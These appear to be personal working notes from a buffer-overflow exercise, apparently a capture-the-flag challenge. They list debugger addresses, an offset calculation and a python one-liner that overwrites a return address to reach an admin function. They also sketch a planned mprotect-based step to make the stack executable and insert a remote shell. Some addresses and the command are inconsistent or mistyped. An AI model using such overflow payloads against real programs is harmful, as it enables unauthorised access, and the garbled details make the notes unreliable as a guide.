gets = 0x00000000004011df
Instruction of isAdmin = 0x080492bc
&name = 0x7fffffffd900

This is THE FUNC WE WANT to overwrite!!!
0x08049299

Register:
$rsp = 0x7fffffffd300 => 6 bytes used
$rbp = 0x7fffffffdb00

previous value of $rsp (stack pointer) = 0x08049294
get to print func

Main stack function:
$rsp = 0xffffc590
just after the jump to printName = 0x00000000 0040116e

get to thsi function: 0x0000000000401146 (main)

TOOD: Need to manipulate the return value to jump to welcomeAdmin

0xffffc58c - 0xffffc56c = 32 bytes needed

python3 "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\08')" > ./challenge

--------------------------------------------------------------------
Address randomisation occurs -> need to update locally

Interesting how the make file did not compile it automatically to 64bit
(x64) and resort to x86 (32 bits) instead

Further supported by the fact that the challenge binary is huge ðŸ˜­

Static linking means we can use the libc binaries

Notice that the main function and f function does not have a stack canary!!

Attack:
We will make the stack executable by using the function
mprotect within libc to remove stack execution protection.

Then insert remote shell

TODO:
We need to know how mprotect function works
